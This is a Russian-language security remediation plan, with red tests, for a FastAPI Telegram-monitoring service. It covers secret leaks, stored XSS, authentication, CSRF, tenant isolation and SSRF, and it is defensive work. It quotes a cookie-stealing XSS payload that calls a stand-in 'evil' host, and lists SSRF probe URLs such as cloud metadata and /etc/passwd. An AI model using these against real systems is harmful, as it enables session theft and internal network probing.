(корень репозитория; до 2026-09-10 он лежал в подкаталоге `Teleton/FastAPI/`):

```
./
├── AGENTS.md                      ← правила работы (Фаза 0, задача 0.6)
├── PROGRESS.md                    ← журнал проходов (Фаза 0, задача 0.7)
├── app/
│   ├── main.py                    # сборка FastAPI, middleware, роутеры
│   ├── config.py                  # pydantic-settings, единственная точка чтения ENV
│   ├── db.py                      # async engine, sessionmaker, get_db()
│   ├── deps.py                    # require_user, require_admin, current_user
│   ├── models/                    # SQLAlchemy: user, session, telegram_account,
│   │                              #   monitor, sent_message, feed_item, log, integration, job
│   ├── security/
│   │   ├── passwords.py           # bcrypt
│   │   ├── sessions.py            # cookie + сессии в БД
│   │   ├── crypto.py              # Fernet: шифрование секретов
│   │   ├── csrf.py                # double-submit token
│   │   └── ratelimit.py
│   ├── api/                       # роутеры: auth, profile, admin, telegram, monitors,
│   │                              #   feed, messages, integrations, logs, cleanup
│   ├── services/
│   │   ├── tg_pool.py             # пул Telethon-клиентов
│   │   ├── fetcher.py             # чтение сообщений из канала
│   │   ├── dedup.py               # атомарная дедупликация
│   │   ├── llm.py                 # OpenRouter
│   │   ├── dispatch.py            # AI → Telegram-бот → n8n → лента
│   │   ├── webhook.py             # отправка вебхука с защитой от SSRF
│   │   └── mailer.py              # письма сброса пароля
│   └── worker.py                  # планировщик, отдельный процесс
├── alembic/versions/
├── scripts/migrate_sqlite_to_pg.py
├── static/
│   ├── index.html                 # разметка без логики
│   ├── css/
│   └── js/                        # feed.js, channels.js, messages.js, integration.js,
│                                  #   logs.js, auth.js, render.js
├── tests/
│   ├── conftest.py
│   └── test_NN_*.py
├── requirements.txt
├── Dockerfile
├── .dockerignore
└── railway.json
```

`server.py` в конце работ удаляется. Не редактируйте его после Фазы 1 — переносите код в модули.

---

## 3. ФАЗА 0 — Экстренное закрытие дыр

**Делается первой, до всего остального.** Если сервис где-то развёрнут — это правки на сегодня.
Фаза не требует Postgres и не ломает работающее приложение.

---

### Задача 0.1 — `.dockerignore` не пускает секреты в образ

**Проблема.** `.dockerignore` содержит `.venv/`, `__pycache__`, `*.session-journal`, но **не** содержит
`.env`, `*.session`, `storage.db`, `key.md`. `Dockerfile:16` делает `COPY . .`. Результат: в образ
попадают реальный `TELEGRAM_API_HASH`, файл `personal_account.session` (живой auth-key аккаунта)
и `storage.db` на 622 КБ с ключом OpenRouter и токеном бота.

**Красный тест** — `tests/test_00_dockerignore.py`:

```python
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
REQUIRED = {".env", "*.session", "storage.db", "key.md", "Ruby/", "exports/", ".git/"}

def test_dockerignore_covers_all_secrets():
    patterns = {
        line.strip()
        for line in (ROOT / ".dockerignore").read_text().splitlines()
        if line.strip() and not line.startswith("#")
    }
    missing = REQUIRED - patterns
    assert not missing, f"В .dockerignore нет: {sorted(missing)}"
```

**Реализация.** Дописать недостающие строки в `.dockerignore`.

**Готово когда:** тест зелёный, и `docker build -t teleton . && docker run --rm teleton ls -la /app`
не показывает ни `.env`, ни `*.session`, ни `storage.db`.

---

### Задача 0.2 — Перевыпуск скомпрометированных секретов

**Это не код, это действие оператора.** Всё, что было в образе или в git-истории, считается
утёкшим навсегда. Удаление файла ничего не отменяет.

Перевыпустить:

- `TELEGRAM_API_ID` / `TELEGRAM_API_HASH` — на my.telegram.org.
- Ключ OpenRouter — отозвать старый в панели OpenRouter, создать новый.
- Токен Telegram-бота — `/revoke` у @BotFather, затем `/token`.
- Сессию MTProto — выйти из всех сторонних сессий в самом Telegram
  (Настройки → Устройства → Завершить все другие сеансы).

**Готово когда:** старые значения нигде не работают. Проверить `git log --all -p -- .env`
и `git log --all --diff-filter=A --name-only | grep -E '\.env|\.session|storage\.db'` — если
секреты когда-либо попадали в историю, нужен `git filter-repo` и force-push.

---

### Задача 0.3 — Ключи не возвращаются наружу

**Проблема.** `server.py:1695` рядом с `api_key_masked` отдаёт сырой `api_key`;
`server.py:1747` — сырой `bot_token`. Один GET-запрос без авторизации отдаёт оба.

**Красный тест** — `tests/test_01_no_secret_leak.py`. Статический уровень: пройтись по AST
`server.py` (позже — по `app/api/integrations.py`) и убедиться, что ни один `return`-словарь
не содержит ключей `api_key`, `bot_token`, `session_string`, `password_hash`. Проще и надёжнее —
проверять фактические ответы:

```python
FORBIDDEN_KEYS = {"api_key", "bot_token", "session_string", "password_hash",
                  "openrouter_api_key", "telegram_bot_token"}

def _walk(obj, path=""):
    """Рекурсивно обходит JSON и возвращает пути до запрещённых ключей."""
    found = []
    if isinstance(obj, dict):
        for k, v in obj.items():
            if k in FORBIDDEN_KEYS:
                found.append(f"{path}.{k}")
            found += _walk(v, f"{path}.{k}")
    elif isinstance(obj, list):
        for i, v in enumerate(obj):
            found += _walk(v, f"{path}[{i}]")
    return found

def test_integrations_endpoints_never_return_raw_secrets(client):
    for url in ("/api/openrouter", "/api/telegram-forward"):
        leaked = _walk(client.get(url).json())
        assert not leaked, f"{url} отдаёт секреты: {leaked}"
```

**Реализация.** Из ответов убрать `api_key` и `bot_token`, оставить `*_masked` и `has_*`.
Фронтенд в `static/index.html` правится соответственно: он и так использует маску для
отображения, а сырое значение только подставлял в поле ввода — вместо этого поле остаётся
пустым с плейсхолдером `••••••••`.

**Осторожно:** в `POST /api/openrouter` есть логика «не перезаписывать ключ, если пришла маска»
(`server.py:1713` — `if req.api_key and not req.api_key.startswith("******")`). Её нужно сохранить,
иначе сохранение формы затрёт ключ пустой строкой.

---

### Задача 0.4 — Устранить stored XSS

**Проблема.** В SPA есть корректный `escapeHtml` (`index.html:3127`), и `formatTelegramText`
им пользуется. Но три места интерполируют данные в `innerHTML` **без** него:

| Строка        | Что не экранируется                     | Кто это контролирует                                           |
| ------------------- | -------------------------------------------------------- | -------------------------------------------------------------------------------- |
| `index.html:2704` | `m.chat_title` в списке каналов          | владелец канала — любой человек в интернете |
| `index.html:3757` | `d.name` в модалке диалогов            | любой, кто написал оператору в личку               |
| `index.html:3719` | `log.chat_title`, `log.event_type` в журнале | то же самое                                                             |

Канал с названием `<img src=x onerror=fetch('//evil/'+document.cookie)>` исполняет JS в панели.
Сейчас красть нечего — сессий нет. После Фазы 2 это станет угоном сессии оператора.

**Красный тест** — `tests/test_02_xss.py`, статический уровень: регуляркой найти все
`innerHTML = \`` в `static/js/**/*.js`и`static/index.html`и убедиться, что внутри шаблонной строки каждая`${...}`-подстановка обёрнута в `esc(` или является литералом/числом.

```python
import re, pathlib

TEMPLATE_INTERP = re.compile(r"\$\{([^}]+)\}")
ALLOWED = re.compile(r"^\s*(esc\(|escapeHtml\(|formatTelegramText\(|[\d.]+$|['\"])")

def test_no_unescaped_interpolation_in_innerhtml():
    violations = []
    for f in pathlib.Path("static").rglob("*.js"):
        # ... найти блоки innerHTML = `...`, проверить каждую ${}
        ...
    assert not violations, "Неэкранированная подстановка в innerHTML:\n" + "\n".join(violations)
```

**Реализация.** Завести короткий алиас `const esc = escapeHtml;` и обернуть все подстановки
пользовательских данных. Числа (`m.chat_id`, `log.messages_count`) экранировать не обязательно,
но проще обернуть всё — тест тогда однозначен.

**Готово когда:** канал с названием `<img src=x onerror=alert(1)>` отображается как текст,
alert не срабатывает ни на вкладке «Каналы», ни в журнале, ни в модалке диалогов.

---

### Задача 0.5 — Убрать мусор из репозитория

- `Ruby/` — вторая копия Rails-шаблона на 2 МБ внутри Python-проекта. Удалить.
- `Teleton/storage.db` в корне — пустой файл на 0 байт при живом `storage.db` на 622 КБ.
  Удалить пустой, иначе однажды приложение запишет данные не туда.
- `monitors.json.bak` — остаток старой миграции. Удалить.

**Тест** — `tests/test_03_repo_hygiene.py`: перечисленных путей не существует.

---

### Задача 0.6 — Написать `AGENTS.md`

Создать `AGENTS.md` с содержимым из раздела 8 этого документа.

---

### Задача 0.7 — Завести `PROGRESS.md`

Создать `PROGRESS.md` — журнал проходов. Формат описан в `AGENTS.md`, §7.
Начальная запись: что сделано в Фазе 0.

---

## 4. ФАЗА 1 — Фундамент данных

Цель: уйти с SQLite на Postgres, получить нормальные миграции и единую точку чтения конфига.
После этой фазы приложение ещё работает по-старому (без логина), но на новой базе.

---

### Задача 1.1 — Зависимости

Добавить в `requirements.txt` с зафиксированными нижними границами:

```
sqlalchemy[asyncio]>=2.0.30
asyncpg>=0.29.0
alembic>=1.13.0
pydantic-settings>=2.2.0
passlib[bcrypt]>=1.7.4
itsdangerous>=2.2.0
cryptography>=42.0.0
slowapi>=0.1.9
```

Dev-зависимости — отдельный `requirements-dev.txt`: `pytest`, `pytest-asyncio`, `httpx`,
`ruff`, `mypy`, `bandit`, `pip-audit`.

**Тест** — `tests/test_10_deps.py`: все перечисленные пакеты импортируются.

---

### Задача 1.2 — `app/config.py`, единая точка чтения ENV

**Проблема, которую это решает.** Сейчас `POST /api/settings` **перезаписывает `.env` целиком**
(`server.py:343`), оставляя в нём 2–3 строки и стирая остальное. На Railway файловая система
эфемерна, поэтому настройка молча теряется при каждом редеплое.

**Красный тест** — `tests/test_11_config.py`:

```python
def test_settings_read_from_env(monkeypatch):
    monkeypatch.setenv("DATABASE_URL", "postgresql+asyncpg://u:p@h/db")
    monkeypatch.setenv("APP_ENCRYPTION_KEY", "x" * 44)
    from app.config import Settings
    s = Settings()
    assert s.database_url.startswith("postgresql+asyncpg://")

def test_app_never_writes_env_file():
    """update_env_file больше не существует ни в одном модуле."""
    import pathlib, re
    for f in pathlib.Path("app").rglob("*.py"):
        src = f.read_text()
        assert "update_env_file" not in src
        assert not re.search(r"open\(\s*ENV_FILE", src)
```

**Реализация.** `pydantic-settings` с полями: `database_url`, `app_encryption_key`,
`secret_key` (для подписи cookie), `telegram_api_id`, `telegram_api_hash`,
`smtp_*` / `resend_api_key`, `app_base_url`, `environment`.
Эндпоинт `POST /api/settings` удаляется полностью — ключи MTProto теперь только из ENV.

---

### Задача 1.3 — Модели SQLAlchemy

Девять таблиц. Ключевое отличие от текущей схемы — `user_id` везде.

| Таблица        | Поля                                                                                                                                                             | Заметки                                                                                 |
| --------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------- |
| `users`             | `id`, `email` (uniq, lower), `password_hash` (nullable — вход только через Google), `timezone`, `is_admin`, `created_at`, `updated_at` | по образцу`Ruby/db/schema.rb:168`                                                   |
| `sessions`          | `id` (UUID), `user_id` FK, `ip_address`, `user_agent`, `created_at`, `last_seen_at`, `expires_at`                                                      | по образцу`Ruby/app/models/session.rb`                                              |
| `telegram_accounts` | `id`, `user_id` FK uniq, `phone`, `session_string_encrypted`, `tg_user_id`, `tg_username`, `status`, `created_at`                                    | заменяет файл`.session`                                                          |
| `tg_auth_attempts`  | `id`, `user_id` FK, `phone`, `phone_code_hash`, `expires_at`                                                                                               | заменяет глобальный`auth_state`                                            |
| `monitors`          | всё из текущей схемы +`user_id` FK                                                                                                                | `id` меняем с TEXT-UUID на BIGINT + отдельная колонка `public_id` |
| `sent_messages`     | всё из текущей +`user_id` FK; `UNIQUE(user_id, chat_id, message_id)`                                                                                 | уникальность теперь в разрезе тенанта                         |
| `feed_items`        | бывшая`analysis_feed` + `user_id`; `photo_base64` **выносится**                                                                           | см. задачу 5.4                                                                         |
| `logs`              | всё из текущей +`user_id` FK                                                                                                                           |                                                                                                |
| `integrations`      | бывшая`integrations_config`, но без `CHECK (id = 1)`; `user_id` FK uniq; ключи в зашифрованных колонках                  |                                                                                                |
| `jobs`              | `id`, `user_id`, `kind`, `payload_json`, `status`, `created_at`, `started_at`, `finished_at`, `error`                                              | ручной запуск из UI                                                              |

**Красный тест** — `tests/test_12_models.py`: у каждой модели из списка есть атрибут `user_id`,
он `nullable=False` и на нём есть индекс.

```python
TENANT_TABLES = ["monitors", "sent_messages", "feed_items", "logs",
                 "integrations", "telegram_accounts", "jobs"]

def test_every_tenant_table_has_indexed_user_id():
    from app.models import Base
    for name in TENANT_TABLES:
        t = Base.metadata.tables[name]
        assert "user_id" in t.c, f"{name}: нет user_id"
        assert not t.c.user_id.nullable, f"{name}: user_id допускает NULL"
        assert any("user_id" in i.columns for i in t.indexes), f"{name}: user_id без индекса"
```

---

### Задача 1.4 — Alembic

**Проблема, которую это решает.** Сейчас схема мигрируется шестью блоками
`try: cur.execute("ALTER TABLE ...") except Exception: pass` (`server.py:144-170`).
Ошибка проглатывается — вы никогда не узнаете, что колонка не добавилась.

**Красный тест** — `tests/test_13_migrations.py`:

```python
def test_no_adhoc_ddl_in_application_code():
    import pathlib, re
    bad = re.compile(r"(ALTER TABLE|CREATE TABLE)", re.I)
    for f in pathlib.Path("app").rglob("*.py"):
        assert not bad.search(f.read_text()), f"DDL в коде приложения: {f}"

@pytest.mark.asyncio
async def test_migrations_produce_expected_schema(pg_url):
    """alembic upgrade head на чистой БД даёт схему, совпадающую с моделями."""
    ...
```

**Реализация.** `alembic init alembic`, настроить на async-движок, сгенерировать начальную
ревизию `alembic revision --autogenerate -m "initial schema"`. **Проверить сгенерированный файл
глазами** — autogenerate регулярно пропускает индексы и `server_default`.

---

### Задача 1.5 — Скрипт миграции данных из SQLite

**Что переносим:** 5 каналов, 192 сообщения, 8 записей ленты, 308 логов, 1 строка настроек.

**Самое важное здесь — `sent_messages`.** Если не перенести историю отправленных ID, первый же
опрос после переезда отправит в n8n все старые посты как новые. Пользователь получит 192 дубля.

**Красный тест** — `tests/test_14_data_migration.py`:

```python
@pytest.mark.asyncio
async def test_migration_preserves_counts_and_dedup(tmp_sqlite, pg_session):
    from scripts.migrate_sqlite_to_pg import migrate
    user = await create_user(pg_session, "owner@example.com")
    stats = await migrate(sqlite_path=tmp_sqlite, session=pg_session, user_id=user.id)

    assert stats == {"monitors": 5, "sent_messages": 192,
                     "feed_items": 8, "logs": 308, "integrations": 1}

    # Дедупликация действительно работает после переезда
    fake = [{"id": known_id, "text": "старый пост"}]
    assert await filter_new(pg_session, user.id, chat_id, fake) == []
```

**Реализация** — `scripts/migrate_sqlite_to_pg.py`. Идемпотентный: повторный запуск не создаёт
дублей (`ON CONFLICT DO NOTHING`). Все записи привязываются к пользователю, переданному
параметром `--user-email`. Секреты из `integrations_config` при переносе **шифруются** (задача 3.4).

---

## 5. ФАЗА 2 — Аутентификация

Паттерны берутся из Rails-шаблона. Читать перед началом:
`Ruby/app/controllers/concerns/authentication.rb`, `sessions_controller.rb`,
`registrations_controller.rb`, `passwords_controller.rb`, `admin/base_controller.rb`.

---

### Задача 2.1 — Хеширование паролей

`app/security/passwords.py`: `hash_password(plain) -> str`, `verify_password(plain, hash) -> bool`
на `passlib` с bcrypt.

**Красный тест** — `tests/test_20_passwords.py`: хеш не равен паролю, начинается с `$2b$`,
проверка проходит для верного и не проходит для неверного, два хеша одного пароля различаются
(соль работает).

---

### Задача 2.2 — Сессии в БД + подписанная cookie

Это прямой порт `Ruby/app/controllers/concerns/authentication.rb`.

`app/security/sessions.py`:

- `create_session(db, user, ip, user_agent) -> Session` — создаёт строку, возвращает объект.
- `resolve_session(db, cookie_value) -> Session | None` — проверяет подпись, ищет в БД,
  проверяет `expires_at`, обновляет `last_seen_at`.
- `destroy_session(db, session_id)`.
- `set_session_cookie(response, session_id)` — `httponly=True`, `secure=True` (в проде),
  `samesite="lax"`, `max_age` = 30 дней.

**Почему сессии в БД, а не JWT.** JWT нельзя отозвать до истечения. Сессия в БД отзывается
удалением строки — это нужно и для «выйти на всех устройствах», и для блокировки аккаунта
админом. Это же решение принято в Rails-шаблоне.

**Красный тест** — `tests/test_21_sessions.py`:

- Подделанная cookie (изменён один символ) → `resolve_session` возвращает `None`.
- Валидная cookie, но строка удалена из БД → `None`.
- Истёкшая сессия → `None`.
- Cookie в ответе имеет флаги `HttpOnly`, `SameSite=Lax`, и `Secure` при `environment=production`.

---

### Задача 2.3 — Закрыто по умолчанию

**Главная задача фазы.** В Rails-шаблоне `before_action :require_authentication` висит на
`ApplicationController`, то есть на всём приложении, а публичные экшены объявляют opt-out явно
(`allow_unauthenticated_access`). Порядок именно такой: забыть закрыть эндпоинт невозможно,
можно только забыть открыть — а это заметно сразу.

**Красный тест** — `tests/test_22_auth_required.py`. Тест перебирает **все** маршруты приложения
и требует, чтобы каждый, кроме явного белого списка, отвечал 401 анониму:

```python
PUBLIC_PATHS = {"/health", "/auth/login", "/auth/signup", "/auth/password-reset",
                "/auth/password-reset/confirm", "/auth/google", "/", "/static"}

def test_every_route_requires_auth_unless_whitelisted(app, anon_client):
    for route in app.routes:
        path = getattr(route, "path", None)
        if not path or any(path.startswith(p) for p in PUBLIC_PATHS):
            continue
        for method in (getattr(route, "methods", None) or {"GET"}):
            r = anon_client.request(method, path.replace("{id}", "1")
                                              .replace("{monitor_id}", "1"))
            assert r.status_code == 401, f"{method} {path} доступен анониму ({r.status_code})"
```

**Реализация.** `app/deps.py`:

```python
async def require_user(request: Request, db = Depends(get_db)) -> User:
    raw = request.cookies.get(SESSION_COOKIE)
    session = await resolve_session(db, raw) if raw else None
    if session is None:
        raise HTTPException(401, "Требуется вход")
    return session.user
```

Вешается на роутер целиком: `APIRouter(dependencies=[Depends(require_user)])`.
Публичные роутеры создаются отдельно и перечисляются в белом списке теста.

---

### Задача 2.4 — Регистрация, вход, выход

| Эндпоинт      | Поведение                                                                                               | Источник паттерна |
| --------------------- | ---------------------------------------------------------------------------------------------------------------- | --------------------------------- |
| `POST /auth/signup` | email + password + timezone браузера; создаёт пользователя и сразу сессию | `registrations_controller.rb`   |
| `POST /auth/login`  | проверка пароля, новая сессия                                                           | `sessions_controller.rb`        |
| `POST /auth/logout` | удаление строки сессии + очистка cookie                                               | там же                       |
| `GET /auth/me`      | текущий пользователь или 401                                                               | —                                |

**Красный тест** — `tests/test_23_registration.py`:

- Регистрация с существующим email → 422, и ответ **не отличается** формулировкой от других
  ошибок валидации настолько, чтобы по нему перебирать пользователей.
- Пароль короче 8 символов → 422.
- После логина `GET /auth/me` отдаёт того же пользователя.
- После логаута та же cookie даёт 401.

---

### Задача 2.5 — Сброс пароля

Порт `Ruby/app/controllers/passwords_controller.rb`. Токен — `itsdangerous.URLSafeTimedSerializer`
с солью `password-reset` и `max_age=3600`.

**Критично:** ответ на `POST /auth/password-reset` **одинаков** независимо от того, существует ли
email. Иначе эндпоинт превращается в перечислитель пользователей. В Rails-шаблоне это сделано
именно так — сравните формулировку в `passwords_controller.rb:create`.

**Красный тест** — `tests/test_24_password_reset.py`:

```python
def test_reset_response_identical_for_known_and_unknown_email(client, existing_user):
    a = client.post("/auth/password-reset", json={"email": existing_user.email})
    b = client.post("/auth/password-reset", json={"email": "nobody@example.com"})
    assert a.status_code == b.status_code
    assert a.json() == b.json()

def test_token_expires(client, frozen_time):
    ...  # токен старше часа отклоняется

def test_token_single_use(client, user):
    ...  # второй раз тот же токен не работает
```

Одноразовость токена: в подпись включается текущий `password_hash` пользователя — после смены
пароля хеш меняется, и старый токен перестаёт проверяться. Это тот же приём, что в Rails
`generates_token_for`.

---

### Задача 2.6 — CSRF

Cookie-аутентификация без CSRF-защиты означает, что сторонний сайт может выполнить действие
от имени залогиненного пользователя.

`app/security/csrf.py` — double-submit token: при создании сессии выдаётся вторая cookie
`csrf_token` (не `HttpOnly`, чтобы JS мог её прочитать), фронтенд шлёт её значение в заголовке
`X-CSRF-Token`, middleware сверяет.

**Красный тест** — `tests/test_25_csrf.py`: любой не-GET-запрос без заголовка → 403;
с неверным заголовком → 403; с верным → проходит. Тест перебирает все не-GET-маршруты,
чтобы нельзя было забыть один.

---

### Задача 2.7 — Rate limiting

В Rails-шаблоне: `rate_limit to: 10, within: 3.minutes` на логине и регистрации.

Защитить `slowapi`:

| Эндпоинт                 | Лимит                                         | Почему                      |
| -------------------------------- | -------------------------------------------------- | --------------------------------- |
| `POST /auth/login`             | 10 / 3 мин на IP                              | брутфорс                  |
| `POST /auth/signup`            | 10 / 3 мин на IP                              | спам-регистрации   |
| `POST /auth/password-reset`    | 5 / час на IP+email                           | спам писем               |
| `POST /api/telegram/send-code` | **3 / час на пользователя** | **самое важное** |

Про последний. Telegram отвечает на спам кодов `FloodWaitError` и может ограничить аккаунт
пользователя на дни. Это не «защита сервера» — это защита аккаунта клиента от вашего же сервиса.

**Красный тест** — `tests/test_26_ratelimit.py`: 11-я попытка логина за 3 минуты возвращает 429;
4-й запрос кода Telegram за час — 429.

---

### Задача 2.8 — Админка

Порт `Ruby/app/controllers/admin/base_controller.rb`: зависимость `require_admin`,
роутер `/api/admin/*`, эндпоинты `GET /api/admin/users`, `GET /api/admin/users/{id}`.

**Красный тест:** обычный пользователь получает 403 на каждом `/api/admin/*`;
админ — 200; аноним — 401.

---

### Задача 2.9 — Почта

`app/services/mailer.py`. В проде — Resend или Postmark по ключу из ENV.
В разработке — писать письмо в `tmp/mail/<timestamp>.html` и логировать путь
(аналог `letter_opener` из Rails-шаблона). Никаких реальных отправок из dev.

---

## 6. ФАЗА 3 — Мульти-тенант

Самая ответственная фаза. Здесь появляется возможность утечки данных между пользователями.

---

### Задача 3.1 — Скоуп по пользователю на уровне слоя доступа

**Не полагайтесь на то, что каждый запрос помнит про `where user_id ==`.** Один забытый фильтр —
и пользователь A читает ленту пользователя B. Заведите слой, в котором забыть невозможно:

```python
class TenantRepo:
    def __init__(self, db: AsyncSession, user_id: int):
        self.db, self.user_id = db, user_id

    def query(self, model):
        return select(model).where(model.user_id == self.user_id)
```

Все роутеры получают `repo: TenantRepo = Depends(get_tenant_repo)` и ходят только через него.

**Красный тест** — `tests/test_30_tenant_isolation.py`. Это самый важный тест проекта.
Он должен перебирать **все** ресурсные эндпоинты автоматически, а не по списку:

```python
@pytest.mark.asyncio
async def test_user_a_cannot_see_or_touch_user_b_resources(client_a, client_b, seeded):
    """A создаёт ресурсы, B не видит их в списках и получает 404 по прямым ID."""
    for path in ("/api/monitors", "/api/feed", "/api/messages", "/api/logs"):
        assert client_b.get(path).json()["items"] == []

    for path, method in [(f"/api/monitors/{seeded.monitor_id}", "PATCH"),
                         (f"/api/monitors/{seeded.monitor_id}", "DELETE"),
                         (f"/api/monitors/{seeded.monitor_id}/run", "POST"),
                         (f"/api/feed/{seeded.feed_id}", "DELETE"),
                         (f"/api/feed/{seeded.feed_id}/reanalyze", "POST")]:
        r = client_b.request(method, path)
        assert r.status_code == 404, f"{method} {path} доступен чужому пользователю"
```

**404, а не 403.** 403 подтверждает существование объекта — это утечка информации.

---

### Задача 3.2 — Telegram-сессии в БД, зашифрованные

Заменяем файл `personal_account.session` на `StringSession` в колонке.

```python
from telethon.sessions import StringSession
client = TelegramClient(StringSession(decrypted), api_id, api_hash)
# после логина:
encrypted = encrypt(client.session.save())
```

**Почему это правильно.** Файл `.session` на Railway живёт до первого редеплоя — ФС эфемерна.
Строка в Postgres переживает всё. Плюс нечего запечь в Docker-образ (проблема из задачи 0.1
становится невозможной по построению).

**Красный тест** — `tests/test_31_tg_session_storage.py`:

```python
def test_session_string_is_encrypted_at_rest(db, user):
    save_tg_session(db, user.id, "1BQANOTEuMTA4LjU2LjE4NAG7...")
    raw = db.execute(text(
        "SELECT session_string_encrypted FROM telegram_accounts WHERE user_id = :u"
    ), {"u": user.id}).scalar()
    assert "1BQANOTE" not in raw          # не лежит открытым текстом
    assert decrypt(raw).startswith("1BQANOTE")

def test_session_string_never_appears_in_any_api_response(client_with_tg_account):
    for path in ("/api/telegram/status", "/api/settings", "/auth/me", "/health"):
        assert "session" not in client_with_tg_account.get(path).text.lower() \
               or "session_string" not in client_with_tg_account.get(path).json()
```

---

### Задача 3.3 — `auth_state` в БД вместо глобальной переменной

**Проблема.** `server.py:39` — модульный словарь `auth_state = {"phone": ..., "phone_code_hash": ...}`.
Два одновременных входа перетирают друг друга; параллельный запрос может завершить чужой логин.
В мульти-тенанте это прямая дыра: пользователь B заканчивает вход, начатый пользователем A,
и получает его аккаунт.

**Реализация.** Таблица `tg_auth_attempts`: `user_id`, `phone`, `phone_code_hash`, `expires_at`
(TTL 10 минут). `POST /api/telegram/sign-in` берёт `phone_code_hash` строго из строки текущего
пользователя, а не из тела запроса.

**Красный тест** — `tests/test_32_auth_state.py`: два параллельных `send-code` от разных
пользователей не мешают друг другу; `sign-in` с `phone_code_hash` чужого пользователя → 400.

---

### Задача 3.4 — Шифрование секретов

`app/security/crypto.py` на `cryptography.fernet`. Ключ — `APP_ENCRYPTION_KEY` из ENV,
в БД не хранится никогда.

Шифруются: `telegram_accounts.session_string`, `integrations.openrouter_api_key`,
`integrations.telegram_bot_token`.

**Красный тест** — `tests/test_33_crypto.py`: шифротекст не содержит открытого текста,
дешифровка возвращает исходное, дешифровка чужим ключом бросает `InvalidToken`,
приложение **отказывается стартовать** при отсутствующем или коротком `APP_ENCRYPTION_KEY`.

Последнее важно: без явного отказа кто-нибудь однажды запустит прод с ключом по умолчанию.

---

### Задача 3.5 — Пул Telethon-клиентов

`app/services/tg_pool.py`. Ключ — `user_id`. Требования:

- Лимит одновременно живых клиентов (напр. 20), вытеснение по LRU.
- Отключение по простою (напр. 10 минут без запросов).
- `asyncio.Lock` на каждого пользователя: два опроса одного аккаунта не идут параллельно.
- Обработка `FloodWaitError`: не ретраить сразу, записать `retry_after` в монитор и пропустить
  цикл. Telethon сам умеет ждать, но при `seconds > 300` это вешает воркер — ловите и отступайте.

**Красный тест** — `tests/test_34_tg_pool.py` с подменённым Telethon-клиентом:
пул не превышает лимит; повторный запрос того же пользователя переиспользует клиент;
идлящий клиент отключается; `FloodWaitError` не приводит к падению цикла.

---

## 7. ФАЗА 4 — Планировщик и надёжность

---

### Задача 4.1 — Воркер как отдельный процесс

**Проблема.** `server.py:37` — глобальный синглтон `client`. Второй uvicorn-воркер означает два
процесса на одном auth-key; Telegram отвечает `AUTH_KEY_DUPLICATED` и может убить сессию.
Поэтому сейчас приложение принципиально одно-процессное.

**Решение — разделение ответственности:**

| Процесс    | Что делает                                                               | С Telethon                                                                                                                                                |
| ----------------- | --------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `web` (uvicorn) | HTTP, логин пользователей, вход в Telegram                 | поднимает**короткоживущий** клиент только на время авторизации и сразу отключает |
| `worker`        | опрос каналов, диспетчеризация, автоочистка | единственный владелец долгоживущих клиентов                                                                        |

Оба — из одного Docker-образа, разные команды. `app/worker.py` — цикл из
`background_monitor_worker` (`server.py:520`), но обходящий мониторы всех пользователей.

**Красный тест** — `tests/test_40_worker.py`: `app/main.py` не импортирует `tg_pool` для
долгоживущих клиентов; воркер стартует и корректно завершается по `SIGTERM`, отключив клиентов.

---

### Задача 4.2 — Атомарная дедупликация

**Проблема.** `filter_and_save_new_messages` (`server.py:363`) делает `SELECT`, потом `INSERT`.
Между ними — окно. Ручной запуск и тик планировщика по одному каналу одновременно → оба
считают пост новым → в n8n уходит два одинаковых вебхука. `INSERT OR IGNORE` спасает строку
в базе, но `new_messages` уже посчитан и отправлен.

**Реализация.** Одним запросом, дедупликация решается базой:

```sql
INSERT INTO sent_messages (user_id, chat_id, message_id, ...)
VALUES ...
ON CONFLICT (user_id, chat_id, message_id) DO NOTHING
RETURNING message_id
```

Вернувшиеся `message_id` — и есть новые. Не вернувшиеся — уже были.

**Красный тест** — `tests/test_41_dedup_race.py`:

```python
@pytest.mark.asyncio
async def test_concurrent_dedup_yields_each_message_once(db, user, monitor):
    msgs = [{"id": i, "text": f"пост {i}"} for i in range(50)]
    a, b = await asyncio.gather(
        filter_new(db, user.id, monitor.chat_id, msgs),
        filter_new(db, user.id, monitor.chat_id, msgs),
    )
    ids = [m["id"] for m in a] + [m["id"] for m in b]
    assert len(ids) == len(set(ids)) == 50, "сообщение обработано дважды"
```

---

### Задача 4.3 — Таблица `jobs` для ручного запуска

Web больше не опрашивает Telegram сам. `POST /api/monitors/{id}/run` пишет строку в `jobs`
и возвращает `202 Accepted` с `job_id`. Воркер забирает через
`SELECT ... FOR UPDATE SKIP LOCKED`. Фронтенд опрашивает `GET /api/jobs/{id}`.

Это тот же принцип «одна база на всё», что в Rails-шаблоне даёт Solid Queue. Redis не нужен.

**Красный тест** — `tests/test_42_jobs.py`: два воркера, забирающие задачи одновременно,
не берут одну и ту же (проверка `SKIP LOCKED`); зависшая задача (`started_at` старше 10 минут)
возвращается в очередь.

---

### Задача 4.4 — Защита от SSRF в вебхуках

**Проблема.** `webhook_url` не валидируется, а `POST /api/webhook/send-payload`
(`server.py:1577`) принимает произвольный payload и постит его куда угодно. Это открытый
прокси во внутреннюю сеть Railway.

`app/services/webhook.py`:

1. Разрешены только схемы `http` и `https`.
2. **Резолвить DNS и проверять полученный IP**, а не строку. Проверка по имени хоста обходится
   доменом, который резолвится в `127.0.0.1`.
3. Запретить приватные и служебные диапазоны: `10/8`, `172.16/12`, `192.168/16`, `127/8`,
   `169.254/16` (метаданные облака), `::1`, `fc00::/7`.
4. Запретить редиректы (`follow_redirects=False`) — иначе проверка обходится редиректом.
5. Таймаут и лимит размера ответа.
6. `POST /api/webhook/send-payload` — удалить. Если функция нужна, она шлёт только на
   **сохранённый** URL пользователя, без возможности указать адрес в запросе.

**Красный тест** — `tests/test_43_ssrf.py`:

```python
@pytest.mark.parametrize("url", [
    "http://127.0.0.1:8000/", "http://169.254.169.254/latest/meta-data/",
    "http://10.0.0.1/", "http://[::1]/", "file:///etc/passwd",
    "http://localtest.me/",          # публичное имя → 127.0.0.1
])
def test_ssrf_urls_rejected(url):
    with pytest.raises(UnsafeWebhookURL):
        validate_webhook_url(url)
```

---

### Задача 4.5 — Лимиты на LLM

Сейчас каждый опрос шлёт полные тексты постов в OpenRouter без потолка (`server.py:795`).
Канал с длинными постами и интервалом 15 минут — это неограниченный счёт.

Добавить: потолок символов на запрос, счётчик израсходованных токенов на пользователя за
период, автоотключение AI при превышении с записью в журнал.

